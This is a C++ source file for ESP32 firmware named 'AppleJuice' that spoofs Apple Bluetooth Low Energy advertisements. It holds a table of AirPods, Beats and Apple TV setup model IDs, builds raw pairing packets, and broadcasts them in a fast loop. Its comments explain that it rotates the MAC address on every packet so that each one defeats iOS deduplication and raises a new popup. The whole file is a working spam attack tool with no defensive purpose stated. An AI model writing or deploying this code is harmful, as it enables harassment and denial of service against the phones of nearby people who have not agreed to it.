#include "AppleJuice.h"
#include <BLEDevice.h>
#include <esp_gap_ble_api.h>
#include <esp_random.h>
#include <string.h>

// ── Device table ──────────────────────────────────────────────────────────────

struct AppleDevice {
    const char* name;
    uint8_t     modelId;
    bool        isSetup;
};

static const AppleDevice DEVICES[] = {
    // Audio — 31-byte packet (model ID at byte 7)
    {"AirPods",                 0x02, false},
    {"PowerBeats",              0x03, false},
    {"Beats X",                 0x05, false},
    {"Beats Solo 3",            0x06, false},
    {"Beats Studio 3",          0x09, false},
    {"AirPods Max",             0x0a, false},
    {"PowerBeats Pro",          0x0b, false},
    {"Beats Solo Pro",          0x0c, false},
    {"AirPods Pro",             0x0e, false},
    {"AirPods Gen 2",           0x0f, false},
    {"Beats Flex",              0x10, false},
    {"Beats Studio Buds",       0x11, false},
    {"Beats Fit Pro",           0x12, false},
    {"AirPods Gen 3",           0x13, false},
    {"AirPods Pro Gen 2",       0x14, false},
    {"Beats Studio Buds+",      0x16, false},
    {"Beats Studio Pro",        0x17, false},
    {"AirPods Pro Gen 2 USB-C", 0x24, false},
    {"Beats Solo 4",            0x25, false},
    {"Beats Solo Buds",         0x26, false},
    {"Software Update",         0x2e, false},
    {"PowerBeats Fit",          0x2f, false},
    // Setup — 23-byte packet (model ID at byte 13)
    {"AppleTV Setup",           0x01, true},
    {"Transfer Number",         0x02, true},
    {"AppleTV Pair",            0x06, true},
    {"Setup New Phone",         0x09, true},
    {"HomePod Setup",           0x0b, true},
    {"AppleTV HomeKit",         0x0d, true},
    {"AppleTV Keyboard",        0x13, true},
    {"TV Color Balance",        0x1e, true},
    {"AppleTV New User",        0x20, true},
    {"Vision Pro",              0x24, true},
    {"AppleTV Network",         0x27, true},
    {"AppleTV AppleID",         0x2b, true},
    {"AppleTV Audio Sync",      0xc0, true},
};

static constexpr int DEVICE_COUNT = (int)(sizeof(DEVICES) / sizeof(DEVICES[0]));

static void buildPacket(const AppleDevice& dev, uint8_t* buf, size_t& outLen) {
    memset(buf, 0, 31);
    if (!dev.isSetup) {
        outLen = 31;
        const uint8_t hdr[] = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07};
        const uint8_t bdy[] = {0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12};
        memcpy(buf, hdr, 7);
        buf[7] = dev.modelId;
        memcpy(buf + 8, bdy, 11);
    } else {
        outLen = 23;
        const uint8_t pre[] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1};
        const uint8_t sfx[] = {0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
        memcpy(buf, pre, 13);
        buf[13] = dev.modelId;
        memcpy(buf + 14, sfx, 9);
    }
}

// Advertising parameters: non-connectable, random address type (key for MAC rotation)
static esp_ble_adv_params_t ADV_PARAMS = {
    .adv_int_min       = 0x20,   // 20 ms
    .adv_int_max       = 0x40,   // 40 ms
    .adv_type          = ADV_TYPE_NONCONN_IND,
    .own_addr_type     = BLE_ADDR_TYPE_RANDOM,   // uses the address set by gap_set_rand_addr
    .peer_addr         = {0, 0, 0, 0, 0, 0},
    .peer_addr_type    = BLE_ADDR_TYPE_PUBLIC,
    .channel_map       = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// ── BLE init ──────────────────────────────────────────────────────────────────

static bool s_bleInited = false;

static void ensureBleInited() {
    if (s_bleInited) return;
    BLEDevice::init("");
    s_bleInited = true;
}

// ── Class implementation ──────────────────────────────────────────────────────

bool AppleJuice::indexMatchesMode(int idx) const {
    if (idx < 0 || idx >= DEVICE_COUNT) return false;
    if (_mode == AppleMode::All)        return true;
    if (_mode == AppleMode::AudioOnly)  return !DEVICES[idx].isSetup;
    if (_mode == AppleMode::SetupOnly)  return  DEVICES[idx].isSetup;
    return false;
}

int AppleJuice::nextIndex(int from) const {
    for (int i = 1; i <= DEVICE_COUNT; i++) {
        int idx = (from + i) % DEVICE_COUNT;
        if (indexMatchesMode(idx)) return idx;
    }
    return (from + 1) % DEVICE_COUNT;
}

const char* AppleJuice::currentName() const {
    int idx = _currentIdx;
    if (idx < 0 || idx >= DEVICE_COUNT) return "—";
    return DEVICES[idx].name;
}

void AppleJuice::setMode(AppleMode m) {
    _mode = m;
    if (!indexMatchesMode(_currentIdx))
        _currentIdx = nextIndex(_currentIdx);
}

// ── Advertising (called from task) ───────────────────────────────────────────

void AppleJuice::advertiseOne() {
    // Stop any running advertisement
    esp_ble_gap_stop_advertising();
    vTaskDelay(pdMS_TO_TICKS(25));

    // New random static-random MAC — iOS deduplicates popups by source address,
    // so a fresh MAC per advertisement lets each one trigger a new popup.
    esp_bd_addr_t addr;
    esp_fill_random(addr, 6);
    addr[0] = (addr[0] & 0x3f) | 0xc0;  // top 2 bits = 11 (static random addr type)
    esp_ble_gap_set_rand_addr(addr);
    vTaskDelay(pdMS_TO_TICKS(25));

    // Build and set raw advertisement data
    uint8_t buf[31];
    size_t  len = 0;
    int     idx = _currentIdx;
    buildPacket(DEVICES[idx], buf, len);
    esp_ble_gap_config_adv_data_raw(buf, (uint8_t)len);
    vTaskDelay(pdMS_TO_TICKS(25));

    // Start advertising with BLE_ADDR_TYPE_RANDOM so the controller
    // uses the address we just set above — not the chip's fixed public MAC.
    esp_ble_gap_start_advertising(&ADV_PARAMS);

    _sentCount++;
    _currentIdx = nextIndex(idx);
    Serial.printf("[AppleJuice] -> %s\n", DEVICES[idx].name);
}

void AppleJuice::taskFunc(void* param) {
    AppleJuice* self = static_cast<AppleJuice*>(param);

    esp_ble_gap_stop_advertising();
    vTaskDelay(pdMS_TO_TICKS(50));

    while (self->_running) {
        self->advertiseOne();
        // Advertise for this window, then switch device
        vTaskDelay(pdMS_TO_TICKS(175));
    }

    esp_ble_gap_stop_advertising();
    self->_task = nullptr;
    vTaskDelete(nullptr);
}

bool AppleJuice::begin(AppleMode mode) {
    if (_running) return true;
    ensureBleInited();
    _mode       = mode;
    _sentCount  = 0;
    _currentIdx = indexMatchesMode(0) ? 0 : nextIndex(-1);
    _running    = true;

    xTaskCreate(taskFunc, "apple_juice", 4096, this, 5, &_task);
    Serial.println("[AppleJuice] started");
    return true;
}

void AppleJuice::stop() {
    if (!_running) return;
    _running = false;
    // Wait for task to exit and clear _task handle (max 600 ms)
    uint32_t deadline = millis() + 600;
    while (_task != nullptr && millis() < deadline) delay(10);
    esp_ble_gap_stop_advertising();
    Serial.printf("[AppleJuice] stopped — %d sent\n", (int)_sentCount);
}

void AppleJuice::update() {
    // BLE runs in its own task; nothing to do here.
    // AppleJuiceApp calls this but only uses the public state accessors.
}
